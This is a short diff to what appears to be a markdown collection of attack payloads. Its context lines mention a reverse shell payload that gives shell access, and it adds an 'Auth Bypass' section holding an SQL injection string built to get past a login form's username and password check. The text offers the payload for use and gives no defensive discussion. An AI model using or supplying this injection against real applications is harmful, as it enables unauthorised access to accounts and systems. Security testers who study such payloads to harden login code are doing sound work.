@@ -15,3 +15,9 @@ Hoax Reverse Shell Payload:
 Execute it and successfully gain shell access, as you can see in the screenshot.
 
 ![img](https://media.licdn.com/dms/image/D4E22AQEMx7xvCP8YLA/feedshare-shrink_1280/0/1714023914371?e=1726099200&v=beta&t=j-GJQ0LxllbbHyNGD2dQGqsx_NFpRnCP_mQxo5z5GCw)
+
+## Auth Bypass
+```sql
+admin')&password=')+or+30>10/
+```
+[img](/assets/sqli_auth_bypass.jpeg)
